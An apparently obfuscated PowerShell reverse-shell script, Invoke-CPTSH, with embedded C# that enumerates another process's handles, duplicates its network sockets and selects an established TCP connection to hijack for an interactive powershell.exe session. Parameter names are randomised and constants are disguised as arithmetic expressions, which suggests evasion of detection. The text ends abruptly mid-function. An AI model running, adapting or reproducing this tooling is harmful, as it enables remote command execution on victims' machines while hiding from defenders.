function Invoke-CPTSH
{   
    
    Param
    (
        [Parameter(Position = 0)]
        [String]
        $MklM3X,
        
        [Parameter(Position = 1)]
        [String]
        $KCYCqBu,

        [Parameter()]
        [String]
        $rz5xe = "$(609 % 117)",

        [Parameter()]
        [String]
        $p9uoQwmq = "$(2 * 40)",

        [Parameter()]
        [String]
        $XRiY0H = "powershell.exe",
        
        [Parameter()]
        [Switch]
        $uDr8E
    )
    
    if( $PSBoundParameters.ContainsKey('uDr8E') ) {
        $MklM3X = "uDr8E"
        $KCYCqBu = "shell"
    }
    else{
  
        if(-Not($PSBoundParameters.ContainsKey('$MklM3X'))) {
            throw "$MklM3X missing parameter"
        }
        
        if(-Not($PSBoundParameters.ContainsKey('KCYCqBu'))) {
            throw "KCYCqBu missing parameter"
        }
    }
    $gKyLWkN = @($MklM3X, $KCYCqBu, $rz5xe, $p9uoQwmq, $XRiY0H)
    Add-Type -TypeDefinition $FukPCMmV -Language CSharp;
    $YSOhGoQ1 = [CPTSHMainClass]::CPTSHMain($gKyLWkN)
    Write-Output $YSOhGoQ1
}

$FukPCMmV = @"

using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Collections.Generic;

public class CPTSHException : Exception
{
    private const string error_string = "[-] CPTSHException: ";

    public CPTSHException() { }

    public CPTSHException(string message) : base(error_string + message) { }
}

public class DeadlockCheckHelper
{

    private bool deadlockDetected;
    private IntPtr targetHandle;

    private delegate uint LPTHREAD_START_ROUTINE(uint lpParam);

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("Kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    private uint ThreadCheckDeadlock(uint threadParams)
    {
        IntPtr objPtr = IntPtr.Zero;
        objPtr = SocketHijacking.NtQueryObjectDynamic(this.targetHandle, SocketHijacking.OBJECT_INFORMATION_CLASS.ObjectNameInformation, $(-58 + 58));
        this.deadlockDetected = false;
        if (objPtr != IntPtr.Zero) Marshal.FreeHGlobal(objPtr);
        return $(-35 + 35);
    }

    public bool CheckDeadlockDetected(IntPtr tHandle)
    {
        this.deadlockDetected = true;
        this.targetHandle = tHandle;
        LPTHREAD_START_ROUTINE delegateThreadCheckDeadlock = new LPTHREAD_START_ROUTINE(this.ThreadCheckDeadlock);
        IntPtr hThread = IntPtr.Zero;
        uint threadId = $(101 % 101);
        //we need native threads, C# threads hang and go in lock. We need to avoids hangs on named pipe so... No hangs no deadlocks... no pain no gains...
        hThread = CreateThread($(276 % 69), $(42 + -42), delegateThreadCheckDeadlock, IntPtr.Zero, $(-25 -bxor -25), out threadId);
        WaitForSingleObject(hThread, $(10500 / 7));
        //we do not kill the "pending" threads here with TerminateThread() because it will crash the whole process if we do it on locked threads.
        //just some waste of threads :(
        CloseHandle(hThread);
        return this.deadlockDetected;
    }
}

public static class SocketHijacking
{

    private const uint NTSTATUS_SUCCESS = 0x00000000;
    private const uint NTSTATUS_INFOLENGTHMISMATCH = 0xc0000004;
    private const uint NTSTATUS_BUFFEROVERFLOW = 0x80000005;
    private const uint NTSTATUS_BUFFERTOOSMALL = 0xc0000023;
    private const int NTSTATUS_PENDING = 0x00000103;
    private const int WSA_FLAG_OVERLAPPED = 0x1;
    private const int DUPLICATE_SAME_ACCESS = 0x2;
    private const int SystemHandleInformation = $(33 - 17);
    private const int PROCESS_DUP_HANDLE = 0x0040;
    private const int SIO_TCP_INFO = unchecked((int)0xD8000027);
    private const int SG_UNCONSTRAINED_GROUP = 0x1;
    private const int SG_CONSTRAINED_GROUP = 0x2;
    private const uint IOCTL_AFD_GET_CONTEXT = 0x12043;
    private const int EVENT_ALL_ACCESS = 0x1f0003;
    private const int SynchronizationEvent = $(-25 / -25);
    private const UInt32 INFINITE = 0xFFFFFFFF;


    private enum SOCKET_STATE : uint
    {
        SocketOpen = $(63 + -63),
        SocketBound = $(-39 / -39),
        SocketBoundUdp = $(43 -bxor 41),
        SocketConnected = $(72 % 23),
        SocketClosed = $(-53 + 56)
    }

    private enum AFD_GROUP_TYPE : uint
    {
        GroupTypeNeither = $(23 - 23),
        GroupTypeConstrained = SG_CONSTRAINED_GROUP,
        GroupTypeUnconstrained = SG_UNCONSTRAINED_GROUP
    }

    public enum OBJECT_INFORMATION_CLASS : int
    {
        ObjectBasicInformation = $(-17 -bxor -17),
        ObjectNameInformation = $(-85 + 86),
        ObjectTypeInformation = $(78 -bxor 76),
        ObjectAllTypesInformation = $(-78 / -26),
        ObjectHandleInformation = $(140 / 35)
    }

    [StructLayout(LayoutKind.Sequential, Pack = $(96 -bxor 97))]
    private struct SYSTEM_HANDLE_TABLE_ENTRY_INFO
    {
        public ushort UniqueProcessId;
        public ushort CreatorBackTraceIndex;
        public byte ObjectTypeIndex;
        public byte HandleAttributes;
        public ushort HandleValue;
        public IntPtr Object;
        public IntPtr GrantedAccess;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct GENERIC_MAPPING
    {
        public int GenericRead;
        public int GenericWrite;
        public int GenericExecute;
        public int GenericAll;
    }

    [StructLayout(LayoutKind.Sequential, Pack = $(57 % 28))]
    private struct OBJECT_TYPE_INFORMATION_V2
    {
        public UNICODE_STRING TypeName;
        public uint TotalNumberOfObjects;
        public uint TotalNumberOfHandles;
        public uint TotalPagedPoolUsage;
        public uint TotalNonPagedPoolUsage;
        public uint TotalNamePoolUsage;
        public uint TotalHandleTableUsage;
        public uint HighWaterNumberOfObjects;// PeakObjectCount;
        public uint HighWaterNumberOfHandles;// PeakHandleCount;
        public uint HighWaterPagedPoolUsage;
        public uint HighWaterNonPagedPoolUsage;
        public uint HighWaterNamePoolUsage;
        public uint HighWaterHandleTableUsage;
        public uint InvalidAttributes;
        public GENERIC_MAPPING GenericMapping;
        public uint ValidAccessMask;
        public byte SecurityRequired;//bool
        public byte MaintainHandleCount;//bool
        public byte TypeIndex;
        public byte ReservedByte;
        public uint PoolType;
        public uint DefaultPagedPoolCharge;// PagedPoolUsage;
        public uint DefaultNonPagedPoolCharge;//NonPagedPoolUsage;
    }

    [StructLayout(LayoutKind.Sequential, Pack = $(301 % 75))]
    private struct OBJECT_NAME_INFORMATION
    {
        public UNICODE_STRING Name;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct WSAData
    {
        public short wVersion;
        public short wHighVersion;
        public short iMaxSockets;
        public short iMaxUdpDg;
        public IntPtr lpVendorInfo;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = $(873 -bxor 616))]
        public string szDescription;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = $(3 * 43))]
        public string szSystemStatus;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    private struct WSAPROTOCOLCHAIN
    {
        public int ChainLen;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = $(4 -bxor 3))]
        public uint[] ChainEntries;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    private struct WSAPROTOCOL_INFO
    {
        public uint dwServiceFlags1;
        public uint dwServiceFlags2;
        public uint dwServiceFlags3;
        public uint dwServiceFlags4;
        public uint dwProviderFlags;
        public Guid ProviderId;
        public uint dwCatalogEntryId;
        public WSAPROTOCOLCHAIN ProtocolChain;
        public int iVersion;
        public int iAddressFamily;
        public int iMaxSockAddr;
        public int iMinSockAddr;
        public int iSocketType;
        public int iProtocol;
        public int iProtocolMaxOffset;
        public int iNetworkByteOrder;
        public int iSecurityScheme;
        public uint dwMessageSize;
        public uint dwProviderReserved;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = $(302 -bxor 46))]
        public string szProtocol;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCKADDR_IN
    {
        public short sin_family;
        public short sin_port;
        public uint sin_addr;
        public long sin_zero;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct TCP_INFO_v0
    {
        public TcpState State;
        public UInt32 Mss;
        public UInt64 ConnectionTimeMs;
        public byte TimestampsEnabled;
        public UInt32 RttUs;
        public UInt32 MinRttUs;
        public UInt32 BytesInFlight;
        public UInt32 Cwnd;
        public UInt32 SndWnd;
        public UInt32 RcvWnd;
        public UInt32 RcvBuf;
        public UInt64 BytesOut;
        public UInt64 BytesIn;
        public UInt32 BytesReordered;
        public UInt32 BytesRetrans;
        public UInt32 FastRetrans;
        public UInt32 DupAcksIn;
        public UInt32 TimeoutEpisodes;
        public byte SynRetrans;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct linger
    {
        public UInt16 l_onoff;
        public UInt16 l_linger;
    }

    [StructLayout(LayoutKind.Sequential, Pack = $(-58 -bxor -58))]
    private struct IO_STATUS_BLOCK
    {
        public int status;
        public IntPtr information;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCK_SHARED_INFO
    {
        public SOCKET_STATE State;
        public Int32 AddressFamily;
        public Int32 SocketType;
        public Int32 Protocol;
        public Int32 LocalAddressLength;
        public Int32 RemoteAddressLength;

        // Socket options controlled by getsockopt(), setsockopt().
        public linger LingerInfo;
        public UInt32 SendTimeout;
        public UInt32 ReceiveTimeout;
        public UInt32 ReceiveBufferSize;
        public UInt32 SendBufferSize;
        /* Those are the bits in the SocketProerty, proper order:
            Listening;
            Broadcast;
            Debug;
            OobInline;
            ReuseAddresses;
            ExclusiveAddressUse;
            NonBlocking;
            DontUseWildcard;
            ReceiveShutdown;
            SendShutdown;
            ConditionalAccept;
        */
        public ushort SocketProperty;
        // Snapshot of several parameters passed into WSPSocket() when creating this socket
        public UInt32 CreationFlags;
        public UInt32 CatalogEntryId;
        public UInt32 ServiceFlags1;
        public UInt32 ProviderFlags;
        public UInt32 GroupID;
        public AFD_GROUP_TYPE GroupType;
        public Int32 GroupPriority;
        // Last error set on this socket
        public Int32 LastError;
        // Info stored for WSAAsyncSelect()
        public IntPtr AsyncSelecthWnd;
        public UInt32 AsyncSelectSerialNumber;
        public UInt32 AsyncSelectwMsg;
        public Int32 AsyncSelectlEvent;
        public Int32 DisabledAsyncSelectEvents;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCKADDR
    {
        public UInt16 sa_family;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = $(99 - 85))]
        public byte[] sa_data;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCKET_CONTEXT
    {
        public SOCK_SHARED_INFO SharedData;
        public UInt32 SizeOfHelperData;
        public UInt32 Padding;
        public SOCKADDR LocalAddress;
        public SOCKADDR RemoteAddress;
        // Helper Data - found out with some reversing
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = $(2 * 12))]
        public byte[] HelperData;
    }

    private struct SOCKET_BYTESIN
    {
        public IntPtr handle;
        public UInt64 BytesIn;
    }


    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int WSADuplicateSocket(IntPtr socketHandle, int processId, ref WSAPROTOCOL_INFO pinnedBuffer);

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
    private static extern IntPtr WSASocket([In] int addressFamily, [In] int socketType, [In] int protocolType, ref WSAPROTOCOL_INFO lpProtocolInfo, Int32 group1, int dwFlags);

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto)]
    private static extern Int32 WSAGetLastError();

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
    private static extern int getpeername(IntPtr s, ref SOCKADDR_IN name, ref int namelen);

    // WSAIoctl1 implementation specific for SIO_TCP_INFO control code
    [DllImport("Ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true, EntryPoint = "WSAIoctl")]
    public static extern int WSAIoctl1(IntPtr s, int dwIoControlCode, ref UInt32 lpvInBuffer, int cbInBuffer, IntPtr lpvOutBuffer, int cbOutBuffer, ref int lpcbBytesReturned, IntPtr lpOverlapped, IntPtr lpCompletionRoutine);

    [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int closesocket(IntPtr s);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(int processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [DllImport("ntdll.dll")]
    private static extern uint NtQueryObject(IntPtr objectHandle, OBJECT_INFORMATION_CLASS informationClass, IntPtr informationPtr, uint informationLength, ref int returnLength);

    [DllImport("ntdll.dll")]
    private static extern uint NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, ref int returnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("ntdll.dll")]
    private static extern int NtCreateEvent(ref IntPtr EventHandle, int DesiredAccess, IntPtr ObjectAttributes, int EventType, bool InitialState);

    // NtDeviceIoControlFile1 implementation specific for IOCTL_AFD_GET_CONTEXT IoControlCode
    [DllImport("ntdll.dll", EntryPoint = "NtDeviceIoControlFile")]
    private static extern int NtDeviceIoControlFile1(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, ref IO_STATUS_BLOCK IoStatusBlock, uint IoControlCode, IntPtr InputBuffer, int InputBufferLength, ref SOCKET_CONTEXT OutputBuffer, int OutputBufferLength);

    [DllImport("Ws2_32.dll")]
    public static extern int ioctlsocket(IntPtr s, int cmd, ref int argp);
    
    //helper method with "dynamic" buffer allocation
    private static IntPtr NtQuerySystemInformationDynamic(int infoClass, int infoLength)
    {
        if (infoLength == $(-3 -bxor -3))
            infoLength = 0x10000;
        IntPtr infoPtr = Marshal.AllocHGlobal(infoLength);
        while (true)
        {
            uint result = (uint)NtQuerySystemInformation(infoClass, infoPtr, infoLength, ref infoLength);
            infoLength = infoLength * $(8 / 4);
            if (result == NTSTATUS_SUCCESS)
                return infoPtr;
            Marshal.FreeHGlobal(infoPtr);  //free pointer when not Successful
            if (result != NTSTATUS_INFOLENGTHMISMATCH && result != NTSTATUS_BUFFEROVERFLOW && result != NTSTATUS_BUFFERTOOSMALL)
            {
                //throw new Exception("Unhandled NtStatus " + result);
                return IntPtr.Zero;
            }
            infoPtr = Marshal.AllocHGlobal(infoLength);
        }
    }

    private static IntPtr QueryObjectTypesInfo()
    {
        IntPtr ptrObjectTypesInformation = IntPtr.Zero;
        ptrObjectTypesInformation = NtQueryObjectDynamic(IntPtr.Zero, OBJECT_INFORMATION_CLASS.ObjectAllTypesInformation, $(-97 + 97));
        return ptrObjectTypesInformation;
    }

    // this from --> https://github.com/hfiref0x/UACME/blob/master/Source/Shared/ntos.h
    private static long AlignUp(long address, long align)
    {
        return (((address) + (align) - $(-67 + 68)) & ~((align) - $(34 + -33)));
    }

    // this works only from win8 and above. If you need a more generic solution you need to use the (i+$(14 - 12)) "way" of counting index types.
    // credits for this goes to @0xrepnz
    // more information here --> https://twitter.com/splinter_code/status/$(2364514609762565000 + -963641600641551400)
    private static byte GetTypeIndexByName(string ObjectName)
    {
        byte TypeIndex = $(77 - 77);
        long TypesCount = $(255 % 51);
        IntPtr ptrTypesInfo = IntPtr.Zero;
        ptrTypesInfo = QueryObjectTypesInfo();
        TypesCount = Marshal.ReadIntPtr(ptrTypesInfo).ToInt64();
        // create a pointer to the first element address of OBJECT_TYPE_INFORMATION_V2
        IntPtr ptrTypesInfoCurrent = new IntPtr(ptrTypesInfo.ToInt64() + IntPtr.Size);
        for (int i = $(132 % 44); i < TypesCount; i++)
        {
            OBJECT_TYPE_INFORMATION_V2 Type = (OBJECT_TYPE_INFORMATION_V2)Marshal.PtrToStructure(ptrTypesInfoCurrent, typeof(OBJECT_TYPE_INFORMATION_V2));
            // move pointer to next the OBJECT_TYPE_INFORMATION_V2 object
            ptrTypesInfoCurrent = (IntPtr)(ptrTypesInfoCurrent.ToInt64() + AlignUp(Type.TypeName.MaximumLength, (long)IntPtr.Size) + Marshal.SizeOf(typeof(OBJECT_TYPE_INFORMATION_V2)));
            if (Type.TypeName.Length > $(1 + -1) && Marshal.PtrToStringUni(Type.TypeName.Buffer, Type.TypeName.Length / $(97 - 95)) == ObjectName)
            {
                TypeIndex = Type.TypeIndex;
                break;
            }
        }
        Marshal.FreeHGlobal(ptrTypesInfo);
        return TypeIndex;
    }

    private static List<IntPtr> DuplicateSocketsFromHandles(List<IntPtr> sockets)
    {
        List<IntPtr> dupedSocketsOut = new List<IntPtr>();
        if (sockets.Count < $(47 - 46)) return dupedSocketsOut;
        foreach (IntPtr sock in sockets)
        {
            IntPtr dupedSocket = DuplicateSocketFromHandle(sock);
            if (dupedSocket != IntPtr.Zero) dupedSocketsOut.Add(dupedSocket);
        }
        // cleaning all socket handles
        foreach (IntPtr sock in sockets)
            CloseHandle(sock);
        return dupedSocketsOut;
    }

    private static List<IntPtr> FilterAndOrderSocketsByBytesIn(List<IntPtr> sockets)
    {
        List<SOCKET_BYTESIN> socketsBytesIn = new List<SOCKET_BYTESIN>();
        List<IntPtr> socketsOut = new List<IntPtr>();
        foreach (IntPtr sock in sockets)
        {
            TCP_INFO_v0 sockInfo = new TCP_INFO_v0();
            if (!GetSocketTcpInfo(sock, out sockInfo))
            {
                closesocket(sock);
                continue;
            }
            // Console.WriteLine("debug: Socket handle 0x" + sock.ToString("X4") + " is in tcpstate " + sockInfo.State.ToString());
            // we need only active sockets, the remaing sockets are filtered out
            if (sockInfo.State == TcpState.SynReceived || sockInfo.State == TcpState.Established)
            {
                SOCKET_BYTESIN sockBytesIn = new SOCKET_BYTESIN();
                sockBytesIn.handle = sock;
                sockBytesIn.BytesIn = sockInfo.BytesIn;
                socketsBytesIn.Add(sockBytesIn);
            }
            else
                closesocket(sock);
        }
        if (socketsBytesIn.Count < $(-20 / -20)) return socketsOut;
        if (socketsBytesIn.Count >= $(8 -bxor 10))
            // ordering for fewer bytes received by the sockets we have a higher chance to get the proper socket
            socketsBytesIn.Sort(delegate (SOCKET_BYTESIN a, SOCKET_BYTESIN b) { return (a.BytesIn.CompareTo(b.BytesIn)); });
        foreach (SOCKET_BYTESIN sockBytesIn in socketsBytesIn)
        {
            socketsOut.Add(sockBytesIn.handle);
            // Console.WriteLine("debug: Socket handle 0x" + sockBytesIn.handle.ToString("X4") + " total bytes received: " + sockBytesIn.BytesIn.ToString());
        }
        return socketsOut;
    }

    private static bool GetSocketTcpInfo(IntPtr socket, out TCP_INFO_v0 tcpInfoOut)
    {
        int result = $(2 -bxor -3);
        UInt32 tcpInfoVersion = $(-55 -bxor -55);
        int bytesReturned = $(-4 + 4);
        int tcpInfoSize = Marshal.SizeOf(typeof(TCP_INFO_v0));
        IntPtr tcpInfoPtr = Marshal.AllocHGlobal(tcpInfoSize);
        result = WSAIoctl1(socket, SIO_TCP_INFO, ref tcpInfoVersion, Marshal.SizeOf(tcpInfoVersion), tcpInfoPtr, tcpInfoSize, ref bytesReturned, IntPtr.Zero, IntPtr.Zero);
        if (result != $(68 - 68))
        {
            // Console.WriteLine("debug: WSAIoctl1 failed with return code " + result.ToString() + " and wsalasterror: '" + WSAGetLastError().ToString());
            tcpInfoOut = new TCP_INFO_v0();
            return false;
        }
        TCP_INFO_v0 tcpInfoV0 = (TCP_INFO_v0)Marshal.PtrToStructure(tcpInfoPtr, typeof(TCP_INFO_v0));
        tcpInfoOut = tcpInfoV0;
        Marshal.FreeHGlobal(tcpInfoPtr);
        return true;
    }

    // this function take a raw handle to a \Device\Afd object as a parameter and returns a handle to a duplicated socket
    private static IntPtr DuplicateSocketFromHandle(IntPtr socketHandle)
    {
        IntPtr retSocket = IntPtr.Zero;
        IntPtr duplicatedSocket = IntPtr.Zero;
        WSAPROTOCOL_INFO wsaProtocolInfo = new WSAPROTOCOL_INFO();
        int status = WSADuplicateSocket(socketHandle, Process.GetCurrentProcess().Id, ref wsaProtocolInfo);
        if (status == $(-91 -bxor -91))
        {
            // we need an overlapped socket for the conpty process but we don't need to specify the WSA_FLAG_OVERLAPPED flag here because it will be ignored (and automatically set) by WSASocket() function if we set the WSAPROTOCOL_INFO structure and if the original socket has been created with the overlapped flag.
            duplicatedSocket = WSASocket(wsaProtocolInfo.iAddressFamily, wsaProtocolInfo.iSocketType, wsaProtocolInfo.iProtocol, ref wsaProtocolInfo, $(7 % 7), $(35 + -35));
            if (duplicatedSocket.ToInt64() > $(-85 + 85))
            {
                retSocket = duplicatedSocket;
            }
        }
        return retSocket;
    }

    //helper method with "dynamic" buffer allocation
    public static IntPtr NtQueryObjectDynamic(IntPtr handle, OBJECT_INFORMATION_CLASS infoClass, int infoLength)
    {
        if (infoLength == $(-88 -bxor -88))
            infoLength = Marshal.SizeOf(typeof(int));
        IntPtr infoPtr = Marshal.AllocHGlobal(infoLength);
        uint result;
        while (true)
        {
            result = (uint)NtQueryObject(handle, infoClass, infoPtr, (uint)infoLength, ref infoLength);
            if (result == NTSTATUS_INFOLENGTHMISMATCH || result == NTSTATUS_BUFFEROVERFLOW || result == NTSTATUS_BUFFERTOOSMALL)
            {
                Marshal.FreeHGlobal(infoPtr);
                infoPtr = Marshal.AllocHGlobal((int)infoLength);
                continue;
            }
            else if (result == NTSTATUS_SUCCESS)
                break;
            else
            {
                //throw new Exception("Unhandled NtStatus ''" + result);
                break;
            }
        }
        if (result == NTSTATUS_SUCCESS)
            return infoPtr;//don't forget to free the pointer with Marshal.FreeHGlobal after you're done with it
        else
            Marshal.FreeHGlobal(infoPtr);//free pointer when not Successful
        return IntPtr.Zero;
    }

    public static List<IntPtr> GetSocketsTargetProcess(Process targetProcess)
    {
        OBJECT_NAME_INFORMATION objNameInfo;
        long HandlesCount = $(-69 + 69);
        IntPtr dupHandle;
        IntPtr ptrObjectName;
        IntPtr ptrHandlesInfo;
        IntPtr hTargetProcess;
        string strObjectName;
        List<IntPtr> socketsHandles = new List<IntPtr>();
        DeadlockCheckHelper deadlockCheckHelperObj = new DeadlockCheckHelper();
        hTargetProcess = OpenProcess(PROCESS_DUP_HANDLE, false, targetProcess.Id);
        if (hTargetProcess == IntPtr.Zero)
        {
            Console.WriteLine("Cannot open target process with pid " + targetProcess.Id.ToString() + " for DuplicateHandle access");
            return socketsHandles;
        }
        ptrHandlesInfo = NtQuerySystemInformationDynamic(SystemHandleInformation, $(344 % 86));
        HandlesCount = Marshal.ReadIntPtr(ptrHandlesInfo).ToInt64();
        // create a pointer at the beginning of the address of SYSTEM_HANDLE_TABLE_ENTRY_INFO[]
        IntPtr ptrHandlesInfoCurrent = new IntPtr(ptrHandlesInfo.ToInt64() + IntPtr.Size);
        // get TypeIndex for "File" objects, needed to filter only sockets objects
        byte TypeIndexFileObject = GetTypeIndexByName("File");
        for (int i = $(-87 + 87); i < HandlesCount; i++)
        {
            SYSTEM_HANDLE_TABLE_ENTRY_INFO sysHandle;
            try
            {
                sysHandle = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)Marshal.PtrToStructure(ptrHandlesInfoCurrent, typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO));
            }
            catch
            {
                break;
            }
            //move pointer to next SYSTEM_HANDLE_TABLE_ENTRY_INFO
            ptrHandlesInfoCurrent = (IntPtr)(ptrHandlesInfoCurrent.ToInt64() + Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO)));
            if (sysHandle.UniqueProcessId != targetProcess.Id || sysHandle.ObjectTypeIndex != TypeIndexFileObject)
                continue;
            if (DuplicateHandle(hTargetProcess, (IntPtr)sysHandle.HandleValue, GetCurrentProcess(), out dupHandle, $(-43 + 43), false, DUPLICATE_SAME_ACCESS))
            {
                if (deadlockCheckHelperObj.CheckDeadlockDetected(dupHandle))
                { // this will avoids deadlocks on special named pipe handles
                    // Console.WriteLine("debug: Deadlock detected");
                    CloseHandle(dupHandle);
                    continue;
                }
                ptrObjectName = NtQueryObjectDynamic(dupHandle, OBJECT_INFORMATION_CLASS.ObjectNameInformation, $(3 - 3));
                if (ptrObjectName == IntPtr.Zero)
                {
                    CloseHandle(dupHandle);
                    continue;
                }
                try
                {
                    objNameInfo = (OBJECT_NAME_INFORMATION)Marshal.PtrToStructure(ptrObjectName, typeof(OBJECT_NAME_INFORMATION));
                }
                catch
                {
                    CloseHandle(dupHandle);
                    continue;
                }
                if (objNameInfo.Name.Buffer != IntPtr.Zero && objNameInfo.Name.Length > $(4 -bxor 4))
                {
                    strObjectName = Marshal.PtrToStringUni(objNameInfo.Name.Buffer, objNameInfo.Name.Length / $(14 -bxor 12));
                    // Console.WriteLine("debug: file handle 0x" + dupHandle.ToString("X4") + " strObjectName = " + strObjectName);
                    if (strObjectName == "\\Device\\Afd")
                        socketsHandles.Add(dupHandle);
                    else
                        CloseHandle(dupHandle);
                }
                else
                    CloseHandle(dupHandle);
                Marshal.FreeHGlobal(ptrObjectName);
                ptrObjectName = IntPtr.Zero;
            }
        }
        Marshal.FreeHGlobal(ptrHandlesInfo);
        List<IntPtr> dupedSocketsHandles = DuplicateSocketsFromHandles(socketsHandles);
        if (dupedSocketsHandles.Count >= $(-35 / -35))
            dupedSocketsHandles = FilterAndOrderSocketsByBytesIn(dupedSocketsHandles);
        socketsHandles = dupedSocketsHandles;
        return socketsHandles;
    }

    public static bool IsSocketInherited(IntPtr socketHandle, Process parentProcess)
    {
        bool inherited = false;
        List<IntPtr> parentSocketsHandles = GetSocketsTargetProcess(parentProcess);
        if (parentSocketsHandles.Count < $(99 - 98))
            return inherited;
        foreach (IntPtr parentSocketHandle in parentSocketsHandles)
        {
            SOCKADDR_IN sockaddrTargetProcess = new SOCKADDR_IN();
            SOCKADDR_IN sockaddrParentProcess = new SOCKADDR_IN();
            int sockaddrTargetProcessLen = Marshal.SizeOf(sockaddrTargetProcess);
            int sockaddrParentProcessLen = Marshal.SizeOf(sockaddrParentProcess);
            if (
                (getpeername(socketHandle, ref sockaddrTargetProcess, ref sockaddrTargetProcessLen) == $(19 - 19)) &&
                (getpeername(parentSocketHandle, ref sockaddrParentProcess, ref sockaddrParentProcessLen) == $(-2 -bxor -2)) &&
                (sockaddrTargetProcess.sin_addr == sockaddrParentProcess.sin_addr && sockaddrTargetProcess.sin_port == sockaddrParentProcess.sin_port)
               )
            {
                // Console.WriteLine("debug: found inherited socket! handle --> 0x" + parentSocketHandle.ToString("X4"));
                inherited = true;
            }
            closesocket(parentSocketHandle);
        }
        return inherited;
    }

    public static bool IsSocketOverlapped(IntPtr socket)
    {
        bool ret = false;
        IntPtr sockEvent = IntPtr.Zero;
        int ntStatus = $(-22 / 22);
        SOCKET_CONTEXT contextData = new SOCKET_CONTEXT();
        ntStatus = NtCreateEvent(ref sockEvent, EVENT_ALL_ACCESS, IntPtr.Zero, SynchronizationEvent, false);
        if (ntStatus != NTSTATUS_SUCCESS)
        {
            // Console.WriteLine("debug: NtCreateEvent failed with error code 0x" + ntStatus.ToString("X8")); ;
            return ret;
        }
        IO_STATUS_BLOCK IOSB = new IO_STATUS_BLOCK();
        ntStatus = NtDeviceIoControlFile1(socket, sockEvent, IntPtr.Zero, IntPtr.Zero, ref IOSB, IOCTL_AFD_GET_CONTEXT, IntPtr.Zero, $(81 + -81), ref contextData, Marshal.SizeOf(contextData));
        // Wait for Completion 
        if (ntStatus == NTSTATUS_PENDING)
        {
            WaitForSingleObject(sockEvent, INFINITE);
            ntStatus = IOSB.status;
        }
        CloseHandle(sockEvent);

        if (ntStatus != NTSTATUS_SUCCESS)
        {
            // Console.WriteLine("debug: NtDeviceIoControlFile failed with error code 0x" + ntStatus.ToString("X8")); ;
            return ret;
        }
        if ((contextData.SharedData.CreationFlags & WSA_FLAG_OVERLAPPED) != $(16 + -16)) ret = true;
        return ret;
    }

    public static IntPtr DuplicateTargetProcessSocket(Process targetProcess, ref bool overlappedSocket)
    {
        IntPtr targetSocketHandle = IntPtr.Zero;
        List<IntPtr> targetProcessSockets = GetSocketsTargetProcess(targetProcess);
        if (targetProcessSockets.Count < $(43 - 42)) return targetSocketHandle;
        else
        {
            foreach (IntPtr socketHandle in targetProcessSockets)
            {
                // we prioritize the hijacking of Overlapped sockets
                if (!IsSocketOverlapped(socketHandle))
                {
                    // Console.WriteLine("debug: Found a usable socket, but it has not been created with the flag WSA_FLAG_OVERLAPPED, skipping...");
                    continue;
                }
                targetSocketHandle = socketHandle;
                overlappedSocket = true;
                break;
            }
            // no Overlapped sockets found, expanding the scope by including also Non-Overlapped sockets
            if (targetSocketHandle == IntPtr.Zero) {
                // Console.WriteLine("debug: No overlapped sockets found. Trying to return also non-overlapped sockets...");
                foreach (IntPtr socketHandle in targetProcessSockets)
                {
                    targetSocketHandle = socketHandle;
                    if (!IsSocketOverlapped(targetSocketHandle)) overlappedSocket = false;
                    break;
                }
            }
        }
        if (targetSocketHandle == IntPtr.Zero)
